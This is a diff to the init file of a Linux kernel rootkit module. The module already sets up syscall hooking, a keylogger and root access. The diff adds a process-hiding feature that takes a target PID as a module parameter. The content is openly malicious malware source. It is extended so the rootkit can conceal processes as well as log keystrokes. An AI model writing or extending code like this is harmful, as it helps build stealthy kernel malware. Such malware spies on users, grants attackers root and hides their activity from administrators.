@@ -9,6 +9,7 @@
 #include "etc.h"
 #include "hooking.h"
 #include "root_access.h"
+#include "hide_proc.h"
 
 // module documentation
 MODULE_LICENSE(DRIVER_LICENSE);
@@ -16,15 +17,16 @@ MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
 
 // module paramters
-// unsigned long lookup_addr = 0;
-// module_param(lookup_addr, ulong, S_IRUGO);
-// MODULE_PARM_DESC(lookup_addr, "The address of kallsyms_lookup_name function from /proc/kallsyms");
+char *pid;
+module_param(pid, charp, S_IRUGO);
+MODULE_PARM_DESC(pid, "The pid of the process we wish to hide, as a string.");
 
 static int __init rootkit_init(void) {
 	init_hooking();
 	init_fops();
 	init_keylogger();
 	init_root_access();
+	init_hide_proc(pid);
 
 	hook();
 	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
